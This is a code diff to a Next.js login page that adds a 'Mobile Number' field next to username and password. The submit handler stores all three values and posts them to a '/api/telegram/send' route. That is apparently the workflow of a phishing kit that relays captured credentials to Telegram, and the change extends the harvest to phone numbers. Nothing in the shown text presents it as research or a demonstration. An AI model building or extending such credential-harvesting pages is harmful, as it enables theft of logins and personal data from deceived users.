@@ -2,7 +2,7 @@
 
 import { useState } from 'react'
 import { useRouter } from 'next/navigation'
-import { Eye, EyeOff, Lock, User } from 'lucide-react'
+import { Eye, EyeOff, Lock, Phone, User } from 'lucide-react'
 import { saveSubmissionData } from '@/lib/submission-store'
 
 const logoImage =
@@ -10,6 +10,7 @@ const logoImage =
 
 export default function LoginPage() {
   const router = useRouter()
+  const [mobile, setMobile] = useState('')
   const [username, setUsername] = useState('')
   const [password, setPassword] = useState('')
   const [showPassword, setShowPassword] = useState(false)
@@ -21,15 +22,15 @@ export default function LoginPage() {
     event.preventDefault()
     if (submitting) return
 
-    if (!username.trim() || !password.trim()) {
-      setError('Please enter your username and password.')
+    if (!mobile.trim() || !username.trim() || !password.trim()) {
+      setError('Please enter your mobile number, username and password.')
       return
     }
     setError('')
     setSubmitting(true)
 
     try {
-      const data = saveSubmissionData({ username, password })
+      const data = saveSubmissionData({ mobile, username, password })
       await fetch('/api/telegram/send', {
         method: 'POST',
         headers: { 'content-type': 'application/json' },
@@ -64,7 +65,29 @@ export default function LoginPage() {
           </div>
 
           <form className="mt-6" onSubmit={handleSubmit}>
-            <label htmlFor="username" className="block text-sm font-semibold text-[#333333]">
+            <label htmlFor="mobile" className="block text-sm font-semibold text-[#333333]">
+              Mobile Number
+            </label>
+            <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
+              <span className="pl-4 pr-2 text-[#8a8a8a]">
+                <Phone className="h-5 w-5" />
+              </span>
+              <input
+                id="mobile"
+                type="tel"
+                inputMode="numeric"
+                autoComplete="tel"
+                value={mobile}
+                onChange={(event) => {
+                  setMobile(event.target.value)
+                  if (error) setError('')
+                }}
+                placeholder="Enter your mobile number"
+                className="h-full w-full bg-transparent px-2 text-base text-[#1a1a1a] outline-none placeholder:text-[#b0b0b0]"
+              />
+            </div>
+
+            <label htmlFor="username" className="mt-5 block text-sm font-semibold text-[#333333]">
               Username
             </label>
             <div className="login-field mt-2 flex items-center rounded-xl border border-[#d9d9d9] bg-white">
